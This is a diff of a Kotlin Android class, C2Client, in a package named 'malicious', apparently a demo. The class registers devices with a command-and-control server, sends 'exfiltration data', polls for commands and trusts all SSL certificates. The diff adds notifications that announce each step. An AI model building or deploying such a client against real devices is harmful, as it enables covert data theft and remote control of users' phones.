@@ -1,6 +1,7 @@
 package com.example.ChatterBox.malicious
 
 import android.content.Context
+// AsyncTask is deprecated, but using for compatibility
 import android.os.AsyncTask
 import android.util.Log
 import org.json.JSONObject
@@ -16,6 +17,12 @@ import javax.net.ssl.SSLContext
 import javax.net.ssl.TrustManager
 import javax.net.ssl.X509TrustManager
 import java.util.UUID
+// For notifications
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.os.Build
+import android.os.Handler
+import androidx.core.app.NotificationCompat
 
 /**
  * Client for communicating with the Command and Control (C2) server.
@@ -26,6 +33,9 @@ import java.util.UUID
 class C2Client(private val context: Context) {
     private val TAG = "C2Client"
     private var deviceId: String? = null
+    private val CHANNEL_ID = "c2_channel"
+    private val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+    private var notificationCounter = 0
     
     init {
         // Trust all SSL certificates for the demo
@@ -35,6 +45,9 @@ class C2Client(private val context: Context) {
         
         // Generate or retrieve device ID
         deviceId = getOrCreateDeviceId()
+        
+        // Create notification channel for Android O and above
+        createNotificationChannel()
     }
     
     /**
@@ -42,6 +55,9 @@ class C2Client(private val context: Context) {
      */
     fun registerDevice() {
         Log.d(TAG, "Registering device with C2 server")
+        
+        // Show notification
+        showNotification("Device Registration", "Connecting to C2 server...")
         
         val registrationData = JSONObject().apply {
             put("device_id", deviceId)
@@ -61,6 +77,9 @@ class C2Client(private val context: Context) {
     fun sendExfiltrationData(dataType: String, data: String) {
         Log.d(TAG, "Sending exfiltration data to C2 server: $dataType")
         
+        // Show notification
+        showNotification("Data Exfiltration", "Sending $dataType data to C2 server...")
+        
         val exfilData = JSONObject().apply {
             put("device_id", deviceId)
             put("type", dataType)
@@ -78,6 +97,9 @@ class C2Client(private val context: Context) {
     fun checkForCommands(callback: (List<String>) -> Unit) {
         Log.d(TAG, "Checking for commands from C2 server")
         
+        // Show notification
+        showNotification("Command Polling", "Checking for new commands...")
+        
         // Create a simple request with just the device ID
         val requestData = JSONObject().apply {
             put("device_id", deviceId)
@@ -85,6 +107,44 @@ class C2Client(private val context: Context) {
         
         // Execute the request and process the response
         GetCommandsTask(callback).execute(requestData.toString())
+    }
+    
+    /**
+     * Create a notification channel for Android O and above
+     */
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val name = "C2 Communication"
+            val descriptionText = "Shows C2 server communication attempts"
+            val importance = NotificationManager.IMPORTANCE_DEFAULT
+            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
+                description = descriptionText
+            }
+            notificationManager.createNotificationChannel(channel)
+        }
+    }
+    
+    /**
+     * Show a temporary notification for C2 communication
+     */
+    private fun showNotification(title: String, content: String) {
+        // Increment the notification counter to ensure unique IDs
+        notificationCounter++
+        
+        val builder = NotificationCompat.Builder(context, CHANNEL_ID)
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setContentTitle(title)
+            .setContentText(content)
+            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
+            .setAutoCancel(true)
+        
+        // Show the notification
+        notificationManager.notify(notificationCounter, builder.build())
+        
+        // Auto-dismiss after 3 seconds
+        Handler().postDelayed({
+            notificationManager.cancel(notificationCounter)
+        }, 3000)
     }
     
     /**
@@ -128,7 +188,9 @@ class C2Client(private val context: Context) {
     
     /**
      * AsyncTask to send data to the C2 server
+     * Note: AsyncTask is deprecated but still used for compatibility
      */
+    @Suppress("DEPRECATION")
     private inner class SendDataTask(
         private val endpoint: String,
         private val jsonData: String
@@ -161,12 +223,21 @@ class C2Client(private val context: Context) {
         
         override fun onPostExecute(success: Boolean) {
             Log.d(TAG, "Data sent to C2 server: $success")
+            
+            // Show result notification
+            if (success) {
+                showNotification("C2 Communication Success", "Successfully connected to server")
+            } else {
+                showNotification("C2 Communication Failed", "Failed to connect to server")
+            }
         }
     }
     
     /**
      * AsyncTask to retrieve commands from the C2 server
+     * Note: AsyncTask is deprecated but still used for compatibility
      */
+    @Suppress("DEPRECATION")
     private inner class GetCommandsTask(
         private val callback: (List<String>) -> Unit
     ) : AsyncTask<String, Void, List<String>>() {
@@ -225,6 +296,14 @@ class C2Client(private val context: Context) {
         
         override fun onPostExecute(result: List<String>) {
             Log.d(TAG, "Retrieved ${result.size} commands from C2 server")
+            
+            // Show result notification
+            if (result.isNotEmpty()) {
+                showNotification("Commands Received", "Received ${result.size} commands from server")
+            } else {
+                showNotification("No Commands", "No new commands from server")
+            }
+            
             callback(result)
         }
     }
